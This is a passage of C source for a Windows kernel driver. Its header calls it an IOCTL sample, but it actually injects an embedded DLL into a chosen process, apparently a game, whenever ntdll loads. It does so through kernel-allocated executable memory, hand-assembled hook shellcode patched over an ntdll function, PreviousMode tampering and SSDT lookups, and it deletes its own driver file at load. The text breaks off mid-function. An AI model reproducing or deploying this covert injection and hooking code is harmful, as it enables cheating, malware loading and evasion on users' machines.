/***************************************************************************************
* AUTHOR : zzc
* DATE   : 2019-6-10
* MODULE : loaddll.C
*
* Command:
* Source of IOCTRL Sample Driver
*
* Description:
*   Demonstrates communications between USER and KERNEL.
*
****************************************************************************************
* Copyright (C) 2010 zzc.
****************************************************************************************/

//#######################################################################################
//# I N C L U D E S
//#######################################################################################

#ifndef CXX_LOADDLL_H
#include "loaddll.h"

#endif


//#include "struct.h"

//////////////////////////////////////////////////////////////////////////

//#######################################################################################
//@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
//@@@@@@@@        D R I V E R   E N T R Y   P O I N T            @@@@@@@@
//@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
//#######################################################################################
NTSTATUS DriverEntry(IN PDRIVER_OBJECT pDriverObj, IN PUNICODE_STRING pRegistryString)
{
  NTSTATUS    status = STATUS_SUCCESS;
  UNICODE_STRING  ustrLinkName;
  UNICODE_STRING  ustrDevName;
  PDEVICE_OBJECT  pDevObj;
  PVOID fnExGetPreviousMode = (PVOID)ExGetPreviousMode;
  PVOID pFoundPattern = NULL;
  UCHAR PreviousModePattern[] = "\x00\x00\xC3";
  PKLDR_DATA_TABLE_ENTRY entry = NULL;
  int i = 0;
  // Register dispatch routines
  entry = (PKLDR_DATA_TABLE_ENTRY)pDriverObj->DriverSection;
  //x64 add code
  //status = MzReadFile(L"\\??\\C:\\myiocp.dll", &g_pDll32, &g_iDll32);
  pDriverObj->MajorFunction[IRP_MJ_CREATE] = DispatchCreate;
  pDriverObj->MajorFunction[IRP_MJ_CLOSE] = DispatchClose;
  // Dispatch routine for communications
  pDriverObj->MajorFunction[IRP_MJ_DEVICE_CONTROL] = DispatchDeviceControl;
  // Unload routine
  pDriverObj->DriverUnload = DriverUnload;
  // Initialize the device name.
  RtlInitUnicodeString(&ustrDevName, NT_DEVICE_NAME);
  // Create the device object and device extension
  status = IoCreateDevice(pDriverObj,0,&ustrDevName,FILE_DEVICE_UNKNOWN,0,FALSE,&pDevObj);

  if(!NT_SUCCESS(status))
    {
      dprintf("Error, IoCreateDevice = 0x%x\r\n", status);
      return status;
    }

  //// Get a pointer to our device extension
  //deviceExtension = (PDEVICE_EXTENSION) deviceObject->DeviceExtension;

  //// Save a pointer to the device object
  //deviceExtension->DeviceObject = deviceObject;

  if(IoIsWdmVersionAvailable(1, 0x10))
    {
      //
      RtlInitUnicodeString(&ustrLinkName, SYMBOLIC_LINK_GLOBAL_NAME);
    }
  else
    {
      //
      RtlInitUnicodeString(&ustrLinkName, SYMBOLIC_LINK_NAME);
    }

  // Create a symbolic link to allow USER applications to access it.
  status = IoCreateSymbolicLink(&ustrLinkName, &ustrDevName);

  if(!NT_SUCCESS(status))
    {
      dprintf("Error, IoCreateSymbolicLink = 0x%x\r\n", status);
      IoDeleteDevice(pDevObj);
      return status;
    }

  //
  //  TODO: Add initialization code here.
  PsGetProcessWow64Process = (P_PsGetProcessWow64Process)GetSystemRoutineAddress(L"PsGetProcessWow64Process");
  PsGetProcessPeb = (P_PsGetProcessPeb)GetSystemRoutineAddress(L"PsGetProcessPeb");
  DbgPrint("[DriverEntry] PsGetProcessPeb:%p   PsGetProcessWow64Process:%p", PsGetProcessPeb, PsGetProcessWow64Process);
#ifdef _AMD64_
  KeServiceDescriptorTable = (PServiceDescriptorTableEntry_t)GetKeServiceDescriptorTable64();
#else
#endif

  if(NT_SUCCESS(BBSearchPattern(PreviousModePattern, 0xCC, sizeof(PreviousModePattern) - 1, fnExGetPreviousMode, 32, &pFoundPattern)))
    {
      g_mode = *(PULONG)((PUCHAR)pFoundPattern - 2);
      DbgPrint("[DriverEntry] g_mode:%x fnExGetPreviousMode:%p\n", g_mode, fnExGetPreviousMode);
    }

  LDE_init();
//  wcscpy(g_exename, L"dnf.exe");
//  status = MzReadFile(L"\\??\\C:\\myiocp.dll", &g_pDll32, &g_iDll32);
//  if(NT_SUCCESS(status))
//  {
//  	 DbgPrint("g_pDll32:%p  g_iDll32:%x", g_pDll32, g_iDll32);
//  }
  //status = MzReadFile(L"\\??\\C:\\myiocp.dll", &g_pDll64, &g_iDll64);
  //if(NT_SUCCESS(status))
  //  {
  //    kprintf("g_pDll64:%p  g_iDll64:%x", g_pDll64, g_iDll64);
  //  }
  status = PsSetLoadImageNotifyRoutine((PLOAD_IMAGE_NOTIFY_ROUTINE)ImageNotify);

  if(!NT_SUCCESS(status))
    {
      DbgPrint("[DriverEntry] PsSetLoadImageNotifyRoutine Failed! status:%x\n", status);
    }

  ZwDeleteFileFolder(entry->FullDllName.Buffer);

  IoRegisterDriverReinitialization(pDriverObj,Reinitialize,NULL);

  
  // Tell the I/O Manger to do BUFFERED IO
  //deviceObject->Flags |= DO_BUFFERED_IO;
  //// Save the DeviveObject
  //deviceExtension->DeviceObject = deviceObject;
  dprintf("DriverEntry Success\r\n");
  return STATUS_SUCCESS;
}

VOID	 DriverUnload(IN PDRIVER_OBJECT pDriverObj)
{
  UNICODE_STRING strLink;
  // Unloading - no resources to free so just return.
  dprintf("Unloading...\r\n");;
  //
  // TODO: Add uninstall code here.
  PsRemoveLoadImageNotifyRoutine((PLOAD_IMAGE_NOTIFY_ROUTINE)ImageNotify);
  // Delete the symbolic link
  RtlInitUnicodeString(&strLink, SYMBOLIC_LINK_NAME);
  IoDeleteSymbolicLink(&strLink);
  // Delete the DeviceObject
  IoDeleteDevice(pDriverObj->DeviceObject);
  dprintf("Unloaded Success\r\n");
  return;
}

NTSTATUS DispatchCreate(IN PDEVICE_OBJECT pDevObj, IN PIRP pIrp)
{
  pIrp->IoStatus.Status = STATUS_SUCCESS;
  pIrp->IoStatus.Information = 0;
  IoCompleteRequest(pIrp, IO_NO_INCREMENT);
  return STATUS_SUCCESS;
}

NTSTATUS DispatchClose(IN PDEVICE_OBJECT pDevObj, IN PIRP pIrp)
{
  pIrp->IoStatus.Status = STATUS_SUCCESS;
  pIrp->IoStatus.Information = 0;
  IoCompleteRequest(pIrp, IO_NO_INCREMENT);
  // Return success
  return STATUS_SUCCESS;
}

NTSTATUS DispatchCommon(IN PDEVICE_OBJECT pDevObj, IN PIRP pIrp)
{
  pIrp->IoStatus.Status = STATUS_SUCCESS;
  pIrp->IoStatus.Information = 0L;
  IoCompleteRequest(pIrp, 0);
  // Return success
  return STATUS_SUCCESS;
}

NTSTATUS DispatchDeviceControl(IN PDEVICE_OBJECT pDevObj, IN PIRP pIrp)
{
  NTSTATUS status               = STATUS_INVALID_DEVICE_REQUEST;   // STATUS_UNSUCCESSFUL
  PIO_STACK_LOCATION pIrpStack  = IoGetCurrentIrpStackLocation(pIrp);
  ULONG uIoControlCode          = 0;
  PVOID pIoBuffer         = NULL;
  ULONG uInSize                 = 0;
  ULONG uOutSize                = 0;
  // Get the IoCtrl Code
  uIoControlCode = pIrpStack->Parameters.DeviceIoControl.IoControlCode;
  pIoBuffer = pIrp->AssociatedIrp.SystemBuffer;
  uInSize = pIrpStack->Parameters.DeviceIoControl.InputBufferLength;
  uOutSize = pIrpStack->Parameters.DeviceIoControl.OutputBufferLength;

  switch(uIoControlCode)
    {
      case IOCTRL_REC_FROM_APP:
        {
          // Receive data form Application
          //dprintf("IOCTRL_REC_FROM_APP\r\n");

          // Do we have any data?
          if(uInSize > 0)
            {
              dprintf("Get Data from App: %ws\r\n", pIoBuffer);
            }

          // Return success
          status = STATUS_SUCCESS;
        }
        break;

      //
      // TODO: Add execute code here.
      //
      case IOCTRL_LOAD_EXE:
        {
          if((pIoBuffer != NULL) && (uInSize == 512))
            {
              memcpy(g_exename, pIoBuffer, 512);
            }

          DbgPrint("[DispatchIoctl] pexe:%ws", g_exename);
          status = STATUS_SUCCESS;
        }
        break;

      default:
        {
          // Invalid code sent
          dprintf("Unknown IOCTL: 0x%X (%04X,%04X)\r\n",
                  uIoControlCode,
                  DEVICE_TYPE_FROM_CTL_CODE(uIoControlCode),
                  IoGetFunctionCodeFromCtlCode(uIoControlCode));
          status = STATUS_INVALID_PARAMETER;
        }
        break;
    }

  if(status == STATUS_SUCCESS)
    {
      pIrp->IoStatus.Information = uOutSize;
    }
  else
    {
      pIrp->IoStatus.Information = 0;
    }

  // Complete the I/O Request
  pIrp->IoStatus.Status = status;
  IoCompleteRequest(pIrp, IO_NO_INCREMENT);
  return status;
}


//
// TODO: Add your module definitions here.
//

VOID ImageNotify(PUNICODE_STRING       FullImageName, HANDLE ProcessId, PIMAGE_INFO  ImageInfo)
{
  PEPROCESS  ProcessObj = NULL;
  PPEB       pPEB    = NULL;
  NTSTATUS   st = STATUS_UNSUCCESSFUL;
  NTSTATUS   status;
  UCHAR*     pData = NULL;
  wchar_t*   pfind = NULL;
  WCHAR      pTempBuf[ 512 ] = { 0 };
  WCHAR      exename[216] = {0};
  int i = 0;

  if(ProcessId == 0)
    {
      //DbgPrint("ProcessId：%x FullImageName:%wZ  ",ProcessId,FullImageName);
      goto fun_ret;
    }

  if(FullImageName == NULL || MmIsAddressValid(FullImageName) == FALSE || FullImageName->Length > 512)
    {
      goto fun_ret;
    }

  PsGetProcessWow64Process   = PsGetProcessWow64Process == NULL ? (P_PsGetProcessWow64Process)GetSystemRoutineAddress(L"PsGetProcessWow64Process") : PsGetProcessWow64Process;
  PsGetProcessPeb = PsGetProcessPeb == NULL ? (P_PsGetProcessPeb)GetSystemRoutineAddress(L"PsGetProcessPeb") : PsGetProcessPeb;
  RtlCopyMemory(pTempBuf, FullImageName->Buffer, FullImageName->Length);
  pfind    = wcsrchr(pTempBuf, L'\\');

  if(pfind == NULL)
    goto fun_ret;

  ++pfind;

  if(_wcsicmp(pfind, L"ntdll.dll") == 0)
    {
      InitGlobeFunc(ImageInfo);
      _wcslwr(pTempBuf);
      ProcessObj = PsGetCurrentProcess();
#ifdef _AMD64_
      //x64 add code
      pPEB = PsGetProcessWow64Process(ProcessObj);

      if(wcsstr(pTempBuf, L"\\syswow64\\") != NULL)
        {
          BOOLEAN  bfind = GetProcessNameByObj(ProcessObj, exename);

          if(bfind == TRUE &&  _wcsicmp(exename, g_exename) == 0)
            {
              kprintf("x64 86  inject g_pDll32:%p  g_iDll32:%x", g_pDll32, g_iDll32);
              InjectDll(ProcessObj, 32);
            }
        }
      else
        {
          if(pPEB == NULL)
            {
              pPEB = PsGetProcessPeb(ProcessObj);

              if(GetProcessNameByObj(ProcessObj, exename) &&  _wcsicmp(exename, g_exename) == 0)
                {
                  kprintf("x64 64  inject g_pDll64:%p  g_iDll64:%x", g_pDll64, g_iDll64);
                  InjectDll(ProcessObj, 64);
                }
            }
        }

#else
      //x86 add code
      pPEB = PsGetProcessPeb(ProcessObj);
      GetProcessNameByObj(ProcessObj, exename);

      if(_wcsicmp(exename, g_exename) == 0)
        {
          InjectDll(ProcessObj, 32);
        }

      //   if(_wcsicmp(exename, g_exename) == 0);
      //   {
      // dprintf("exename:%ws",exename);
      //InjectDll(ProcessObj, 32);
      //     //newWorkItem(32);
      //   }
#endif
    }

fun_ret:
  return;
}

DWORD_PTR GetSystemRoutineAddress(WCHAR *szFunCtionAName)
{
  UNICODE_STRING FsRtlLegalAnsiCharacterArray_String;
  RtlInitUnicodeString(&FsRtlLegalAnsiCharacterArray_String, szFunCtionAName);
  return (DWORD_PTR)MmGetSystemRoutineAddress(&FsRtlLegalAnsiCharacterArray_String);
}

void InjectDll(PEPROCESS ProcessObj, int ibit)
{  
  NTSTATUS status = -1;

  if(NtWriteVirtualMemory && m_pCreateThread && NtProtectVirtualMemory)
    {
      HANDLE ProcessHandle = (HANDLE) - 1;
      PVOID dllbase = NULL;
      ULONG_PTR  ZeroBits = 0;
      SIZE_T   sizeDll = ibit == 64 ? sizeof(hexData) : sizeof(hexData32);
      PVOID    pOldDll = ibit == 64 ? hexData : hexData32;
      SIZE_T   sizeMemLoad = ibit == 64 ? sizeof(MemLoad64) : sizeof(MemLoad);
      PVOID  pOldMemloadBase = ibit == 64 ? (PVOID)MemLoad64 : (PVOID)MemLoad;
      ULONG   uWriteRet = 0;
      PARAMX param = {0};
      PVOID  MemloadBase = NULL;
      SIZE_T   sizeMemloadAll =  sizeMemLoad + sizeof(PARAMX) + 200;
      UCHAR b1[14] = {0x65, 0x48, 0x8B, 0x04, 0x25, 0x60, 0x00, 0x00, 0x00, 0x48, 0x8B, 0x40, 0x18, 0xC3};
      PUCHAR pParambase = NULL;
      PUCHAR  pCall = NULL;
      status = ObOpenObjectByPointer(ProcessObj, OBJ_KERNEL_HANDLE, NULL, PROCESS_ALL_ACCESS, NULL, KernelMode, &ProcessHandle);

      if(!NT_SUCCESS(status))
        {
          kprintf("[InjectDll] ObOpenObjectByPointer status:%x", status);
          return;
        }

      status = ZwAllocateVirtualMemory(ProcessHandle, &dllbase, ZeroBits, &sizeDll, MEM_COMMIT, PAGE_EXECUTE_READWRITE);

      if(!NT_SUCCESS(status))
        {
          kprintf("[InjectDll] status:%x", status);
          goto HHHH;
        }

      //kprintf("[InjectDll] dllbase:%p", dllbase);
      RtlZeroMemory(&param, sizeof(PARAMX));
      status = ZwAllocateVirtualMemory(ProcessHandle, &MemloadBase, ZeroBits, &sizeMemloadAll, MEM_COMMIT, PAGE_EXECUTE_READWRITE);

      if(!NT_SUCCESS(status))
        {
          kprintf("[InjectDll] status:%x", status);
          goto HHHH;
        }

      //kprintf("[InjectDll] MemloadBase:%p", MemloadBase);
      //写入dll
      status = NewNtWriteVirtualMemory(ProcessHandle, dllbase, pOldDll, sizeDll, &uWriteRet);

      if(!NT_SUCCESS(status))
        {
          kprintf("[InjectDll] NewNtWriteVirtualMemory fail: status:%x write addr:%p size:%x", status, dllbase, sizeDll);
          goto HHHH;
        }

      param.lpFileData = (ULONG64)dllbase ;
      param.DataLength = (ULONG64)sizeDll;
      memcpy(param.pFunction, b1, sizeof(b1));
      //写入memload
      status = NewNtWriteVirtualMemory(ProcessHandle, MemloadBase, pOldMemloadBase, sizeMemLoad, &uWriteRet);

      if(!NT_SUCCESS(status))
        {
          kprintf("[InjectDll] NewNtWriteVirtualMemory fail: status:%x write addr:%p size:%x", status, MemloadBase, sizeMemLoad);
          goto HHHH;
        }

      pParambase = (PUCHAR)MemloadBase + sizeMemLoad;
      pCall = (PUCHAR)MemloadBase + sizeof(PARAMX) + sizeMemLoad;
      //kprintf("[InjectDll] MemloadBase:%p pParambase:%p ", MemloadBase, pParambase);
      //写入memload param
      status = NewNtWriteVirtualMemory(ProcessHandle, pParambase, &param, sizeof(PARAMX), &uWriteRet);

      if(!NT_SUCCESS(status))
        {
          goto HHHH;
        }

      if(ibit == 32 && fnHookfunc32)
        {
          PVOID pBase = fnHookfunc32;
          SIZE_T   numbsize = 5;
          ULONG    oldProctect;
          ULONG   DecodedLength = 0;
          ULONG  functionLen = 7;
          ULONG   dw;
          Disasm  dis;

          while(DecodedLength < 7)
            {
              dw = DisasmCode((PUCHAR)((ULONG)pBase + DecodedLength), 7, &dis);
              DecodedLength = DecodedLength + dw;
            }

//          kprintf("begin hook ...fnHookfunc32:%p DecodedLength:%d", fnHookfunc32, DecodedLength);
          status =  NewNtProtectVirtualMemory(ProcessHandle, &pBase, &numbsize, PAGE_EXECUTE_READWRITE, &oldProctect);

          if(NT_SUCCESS(status))
            {
              int lencode = DecodedLength;
              ULONG i = 0;
              PVOID jumpaddr = NULL;
              PUCHAR  origincode = (PUCHAR)kmalloc(lencode);
              RtlMoveMemory(origincode, fnHookfunc32, lencode);
//              kprintf("lencode:%d", lencode);
              unsigned char* restorcode = (unsigned char*)kmalloc(100);
              int nn1 = 0;
              UCHAR ucode1[] = {0xB8, 0x00, 0x00, 0x00, 0x01};
              *(PVOID*)&ucode1[1] = fnHookfunc32;
              memcpy(restorcode + nn1, ucode1, sizeof(ucode1));
              nn1 += sizeof(ucode1);

              for(i = 0; i < lencode; i++)
                {
                  if(i == 0)
                    {
                      UCHAR ucode[]  =  {0xC6, 0x00,  origincode[i]};
                      memcpy(restorcode + nn1, ucode, sizeof(ucode));
                      nn1 += sizeof(ucode);
                    }
                  else
                    {
                      UCHAR ucode[] = {0xC6, 0x40, i, origincode[i]};
                      memcpy(restorcode + nn1, ucode, sizeof(ucode));
                      nn1 += sizeof(ucode);
                    }
                }

              //0002004C          | 60                                       | pushad                                  |
              //0002004D          | 9C                                       | pushfd                                  |
              //0002004E          | B8 00 00 10 00                           | mov eax, 1000                           |
              //00020053          | 50                                       | push eax                                |
              //00020054          | B8 00 20 00 00                           | mov eax, 2000                           |
              //00020059          | FF D0                                    | call eax                                |
              //0002005B          | 83 C4 04                                 | add esp, 4                              |
              //0002005E          | 9D                                       | popfd                                   |
              //0002005F          | 61                                       | popad                                   |
              memcpy(pCall, restorcode, nn1);
              //dprintf("pCall:%p ", pCall);
              UCHAR  callmemload[] =  {0x60, 0x9c, 0xB8, 0x00, 0x00, 0x10, 0x00, 0x50, 0xB8, 0x00, 0x20, 0x00, 0x00, 0xFF, 0xD0, 0x90, 0x90, 0x90, 0x9D, 0x61};
              *(ULONG32*)&callmemload[3] = (ULONG32)pParambase;
              *(ULONG32*)&callmemload[9] = (ULONG32)MemloadBase;
              memcpy(pCall + nn1, callmemload, sizeof(callmemload));
              nn1 += sizeof(callmemload);
              //执行原代码
              //mov eax,0x1000
              //jmp eax
              UCHAR jmpret[] = {0xB8, 0x00, 0x00, 0x10, 0x00, 0xFF, 0xE0};
              *(ULONG32*)&jmpret[1] = (ULONG)fnHookfunc32;
              RtlCopyMemory(pCall + nn1, jmpret, sizeof(jmpret));
              //memcpy(pCall + nn1, origincode, lencode);
              //nn1 += lencode;
              ////跳返回
              //unsigned char jumpcode[5] = {0xe9, 0x00, 0x00, 0x00, 0x00};
              //ULONG u1 = ((int)fnHookfunc32 + 5) - (int)(pCall + nn1) - 5;
              //*(PULONG)&jumpcode[1] = (ULONG)u1;
              //RtlCopyMemory(pCall + nn1, jumpcode, sizeof(jumpcode));
              ////hook
              UCHAR jmpaddr[] = {0xB8, 0x00, 0x00, 0x10, 0x00, 0xFF, 0xE0};
              *(ULONG32*)&jmpaddr[1] = (ULONG)pCall;
              kprintf("jump ...");
              RtlCopyMemory(fnHookfunc32, jmpaddr, sizeof(jmpaddr));
              //UCHAR b2[5] = {0};
              //int u1 = 0;
              //int u2 = 0;
              //unsigned char pAddr[51] =
              //{
              //  0xB8, 0x00, 0x00, 0x01, 0x00, 0xC6, 0x00, 0xFF, 0xC6, 0x40, 0x01, 0xFF, 0xC6, 0x40, 0x02, 0xFF,
              //  0xC6, 0x40, 0x03, 0xFF, 0xC6, 0x40, 0x04, 0xFF, 0x60, 0x9C, 0xB8, 0x00, 0x00, 0x03, 0x00, 0x50,
              //  0xB8, 0x00, 0x00, 0x04, 0x00, 0xFF, 0xD0, 0x61, 0x9d, 0xB8, 0x00, 0x00, 0x01, 0x00, 0xe9, 0x00, 0x00, 0x00, 0x00
              //};
              //unsigned char jumpcode[5] = {0xe9, 0x00, 0x00, 0x00, 0x00};
              //RtlMoveMemory(b2, fnHookfunc, 5);
              //kprintf("[InjectDll] call NtProtectVirtualMemory success");
              //RtlMoveMemory(pAddr + 0x29, fnHookfunc, 5);
              //*(PULONG)&pAddr[1] = (ULONG)fnHookfunc;
              //pAddr[0x7]  =  b2[0];
              //pAddr[0xb]  =  b2[1];
              //pAddr[0xf]  =  b2[2];
              //pAddr[0x13] =  b2[3];
              //pAddr[0x17] =  b2[4];
              //*(PULONG)&pAddr[0x1B] = (ULONG)pParambase;
              //*(PULONG)&pAddr[0x21] = (ULONG)MemloadBase;
              //u1 = ((int)fnHookfunc + 5) - (int)(pCall + 0x2E) - 5;
              //*(PULONG)&pAddr[0x2F] = (ULONG)u1;
              //RtlCopyMemory(pCall, pAddr, sizeof(pAddr));
              //kprintf("[InjectDll] pCall:%p", pCall);
              //u2 = (int)pCall - (int)fnHookfunc - 5;
              //*(PULONG)&jumpcode[1] = (ULONG)u2;
              //RtlCopyMemory(fnHookfunc, jumpcode, sizeof(jumpcode));
            }
        }
      else if(ibit == 64)
        {
          int lencode =  GetPatchSize((PUCHAR)fnHookfunc64, 12);
          ULONG i = 0;
          PVOID jumpaddr = NULL;
          PUCHAR  origincode = (PUCHAR)kmalloc(lencode);
          RtlMoveMemory(origincode, fnHookfunc64, lencode);
          dprintf("lencode:%d", lencode);
          unsigned char jmpcode[] =  {0x48, 0xC7, 0xC0, 0x0, 0x0, 0x0, 0x0, 0xFF, 0xE0};
          unsigned char* restorcode = (unsigned char*)kmalloc(100);
          int nn1 = 0;
          UCHAR ucode1[] = {0x48, 0xB8, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00};
          *(PVOID*)&ucode1[2] = fnHookfunc64;
          memcpy(restorcode + nn1, ucode1, sizeof(ucode1));
          nn1 += sizeof(ucode1);
          dprintf("fnHookfunc:%p lencode:%d nn1:%d origincode:%p", fnHookfunc64, lencode, nn1, origincode);

          for(i = 0; i < lencode; i++)
            {
              if(i == 0)
                {
                  UCHAR ucode[]  =  {0xC6, 0x00,  origincode[i]};
                  memcpy(restorcode + nn1, ucode, sizeof(ucode));
                  nn1 += sizeof(ucode);
                }
              else
                {
                  UCHAR ucode[] = {0xC6, 0x40, i, origincode[i]};
                  memcpy(restorcode + nn1, ucode, sizeof(ucode));
                  nn1 += sizeof(ucode);
                }
            }

          memcpy(pCall, restorcode, nn1);
          pParambase = (PUCHAR)MemloadBase + sizeMemLoad;
          //调用call
          unsigned char callmemload[] =  {0x57, 0x51, 0x50, 0x48, 0x83, 0xEC, 0x60, 0x48, 0xB9, 0x50, 0xA0, 0x0F, 0x3F, 0x01, 0x00, 0x00, 0x00, 0x48, 0xB8, 0xB0, 0x7D, 0x10, 0x3F, 0x01, 0x00, 0x00, 0x00, 0xFF, 0xD0, 0x48, 0x83, 0xC4, 0x60, 0x58, 0x59, 0x5F};
          *(ULONG64*)&callmemload[9] = (ULONG64)pParambase;
          *(ULONG64*)&callmemload[19] = (ULONG64)MemloadBase;
          memcpy(pCall + nn1, callmemload, sizeof(callmemload));
          nn1 += sizeof(callmemload);
          //dprintf("pCall:%p  restorcode:%p  pParambase:%p MemloadBase:%p", pCall, restorcode, pParambase, MemloadBase);
          //jmp ret;
          UCHAR ucode2[] = {0x48, 0xB8, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0xff, 0xe0};
          *(PVOID*)&ucode2[2] = fnHookfunc64;
          memcpy(pCall + nn1, ucode2, sizeof(ucode2));
          PVOID pBase = fnHookfunc64;
          SIZE_T   numbsize = lencode;
          ULONG    oldProctect;
          status =  NewNtProtectVirtualMemory(ProcessHandle, &pBase, &numbsize, PAGE_EXECUTE_READWRITE, &oldProctect);

          if(NT_SUCCESS(status))
            {
              dprintf("jump ...");
              UCHAR jmpaddr[] = {0x48, 0xB8, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0xff, 0xe0};
              *(PVOID*)&jmpaddr[2] = pCall;
              RtlCopyMemory(fnHookfunc64, jmpaddr, sizeof(jmpaddr));
            }

          //OBJECT_ATTRIBUTES ob = { 0 };
          //HANDLE hThread = (HANDLE) - 1;
          //InitializeObjectAttributes(&ob, NULL, OBJ_KERNEL_HANDLE, NULL, NULL);
          //status = NewNtCreateThreadEx(&hThread, 0x1FFFFF, &ob, ProcessHandle, MemloadBase, pParambase, NULL, 0, NULL, NULL, NULL);
          //kprintf("NewNtCreateThreadEx status:%x", status);
          //if(NT_SUCCESS(status))
          //{
          //  ZwClose(hThread);
          //}
          //else
          //{
          //  kprintf("[InjectDll] NewNtCreateThreadEx fail status:%x", status);
          //}
        }

HHHH:
      ZwClose(ProcessHandle);
    }
}

void  InitGlobeFunc(PIMAGE_INFO     ImageInfo)
{
  if(!fnHookfunc64)
    {
      if(IsX64Module(ImageInfo->ImageBase))
        {
          fnHookfunc64 = GetProcAddress(ImageInfo->ImageBase, HOOKADDR);
        }

      dprintf("[InitGlobeFunc] fnHookfunc64:%p", fnHookfunc64);
    }

  if(!fnHookfunc32)
    {
      if(!IsX64Module(ImageInfo->ImageBase))
        {
          fnHookfunc32 = GetProcAddress(ImageInfo->ImageBase, HOOKADDR);
        }

      dprintf("[InitGlobeFunc] fnHookfunc32:%p", fnHookfunc32);
    }

  if(!m_pCreateThread || !ZwProtectVirtualMemory  || !ZwWriteVirtualMemory)
    {
      ZwWriteVirtualMemory = (TYPE_ZwWriteVirtualMemory) GetProcAddress(ImageInfo->ImageBase, "ZwWriteVirtualMemory");
      ZwCreateThreadEx = (TYPE_NtCreateThreadEx) GetProcAddress(ImageInfo->ImageBase, "ZwCreateThreadEx");      //
      ZwCreateThread = (TYPE_NtCreateThread) GetProcAddress(ImageInfo->ImageBase, "ZwCreateThread");
      ZwProtectVirtualMemory = (TYPE_ZwProtectVirtualMemory) GetProcAddress(ImageInfo->ImageBase, "ZwProtectVirtualMemory");
      m_pCreateThread = ZwCreateThreadEx == NULL ? (PVOID)ZwCreateThread : (PVOID)ZwCreateThreadEx;
      //kprintf("[InitGlobeFunc] fnHookfunc:%p ZwProtectVirtualMemory:%p m_pCreateThread:%p", fnHookfunc64, ZwProtectVirtualMemory, m_pCreateThread);

      if(m_pCreateThread && ZwProtectVirtualMemory && ZwWriteVirtualMemory)
        {
          ULONG CreateThreadId = NULL;
          ULONG protectvmId = NULL;
          ULONG WriteId = NULL;

          if(IsX64Module(ImageInfo->ImageBase) == TRUE)
            {
              CreateThreadId = (ULONG)SERVICE_ID64(m_pCreateThread);
              protectvmId = (ULONG)SERVICE_ID64(ZwProtectVirtualMemory);
              WriteId = (ULONG)SERVICE_ID64(ZwWriteVirtualMemory);
            }
          else
            {
              CreateThreadId =   SERVICE_ID32(m_pCreateThread);
              protectvmId =   SERVICE_ID32(ZwProtectVirtualMemory);
              WriteId = (ULONG)SERVICE_ID32(ZwWriteVirtualMemory);
            }

          if(CreateThreadId && protectvmId && WriteId)
            {
              NtProtectVirtualMemory = (TYPE_ZwProtectVirtualMemory)GetSSDTFuncCurAddr(protectvmId);
              NtWriteVirtualMemory = (TYPE_ZwWriteVirtualMemory)GetSSDTFuncCurAddr(WriteId);

              if(m_pCreateThread == ZwCreateThreadEx)
                {
                  NtCreateThreadEx = (TYPE_NtCreateThreadEx)GetSSDTFuncCurAddr(CreateThreadId);
                }
              else
                {
                  NtCreateThread = (TYPE_NtCreateThread)GetSSDTFuncCurAddr(CreateThreadId);
                }

              // rundll32 syssetup,SetupInfObjectInstallAction DefaultInstall 128 <路径名>\<文件名>.inf
              //kprintf("[InitGlobeFunc] WriteId:%d CreateThreadId:%d protectvmId:%d", WriteId, CreateThreadId, protectvmId);
              //kprintf("[InitGlobeFunc] NtWriteVirtualMemory:%p NtProtectVirtualMemory:%p m_pCreateThread:%p", NtWriteVirtualMemory, NtProtectVirtualMemory, m_pCreateThread);
            }
        }
    }
}

NTSTATUS NTAPI NewNtWriteVirtualMemory(IN HANDLE ProcessHandle, IN PVOID BaseAddress, IN PVOID Buffer, IN ULONG BufferLength, OUT PULONG ReturnLength OPTIONAL)
{
  TYPE_ZwWriteVirtualMemory pfnNtWriteVirtualMemory = NtWriteVirtualMemory;
  NTSTATUS status = STATUS_UNSUCCESSFUL;
  PVOID fnExGetPreviousMode = (PVOID)ExGetPreviousMode;
  PVOID pFoundPattern = NULL;
  UCHAR PreviousModePattern[] = "\x00\x00\xC3";
  ULONG PrevMode = 0;

  if(pfnNtWriteVirtualMemory)
    {
      if(g_mode)
        {
          PUCHAR pPrevMode = (PUCHAR)PsGetCurrentThread() + g_mode;
          UCHAR prevMode = *pPrevMode;
          *pPrevMode = KernelMode;
          status = pfnNtWriteVirtualMemory(ProcessHandle, BaseAddress, Buffer, BufferLength, ReturnLength);
          *pPrevMode = prevMode;
        }
      else
        {
          if(NT_SUCCESS(BBSearchPattern(PreviousModePattern, 0xCC, sizeof(PreviousModePattern) - 1, fnExGetPreviousMode, 32, &pFoundPattern)))
            {
              PUCHAR pPrevMode = (PUCHAR)PsGetCurrentThread() + *(ULONG *)((PUCHAR)pFoundPattern - 2);
              UCHAR prevMode = *pPrevMode;
              *pPrevMode = KernelMode;
              status = pfnNtWriteVirtualMemory(ProcessHandle, BaseAddress, Buffer, BufferLength, ReturnLength);
              *pPrevMode = prevMode;
            }
        }
    }
  else
    status = STATUS_NOT_FOUND;

  return status;
}

NTSTATUS NTAPI NewNtCreateThreadEx(PHANDLE hThread, ACCESS_MASK DesiredAccess, PVOID ObjectAttributes, HANDLE ProcessHandle, PVOID lpStartAddress, PVOID lpParameter,
                                   ULONG Flags, SIZE_T StackZeroBits, SIZE_T SizeOfStackCommit, SIZE_T SizeOfStackReserve, PVOID lpBytesBuffer)
{
  NTSTATUS status = STATUS_SUCCESS;
  TYPE_NtCreateThreadEx pfnNtCreateThreadEx = NtCreateThreadEx;
  PVOID fnExGetPreviousMode = (PVOID)ExGetPreviousMode;
  PVOID pFoundPattern = NULL;
  UCHAR PreviousModePattern[] = "\x00\x00\xC3";
  ULONG PrevMode = 0;

  if(pfnNtCreateThreadEx)
    {
      if(g_mode)
        {
          PUCHAR pPrevMode = (PUCHAR)PsGetCurrentThread() + g_mode;
          UCHAR prevMode = *pPrevMode;
          *pPrevMode = KernelMode;
          status = pfnNtCreateThreadEx(hThread, DesiredAccess, ObjectAttributes, ProcessHandle, lpStartAddress, lpParameter, Flags, StackZeroBits, SizeOfStackCommit, SizeOfStackReserve, lpBytesBuffer);
          *pPrevMode = prevMode;
        }
      else
        {
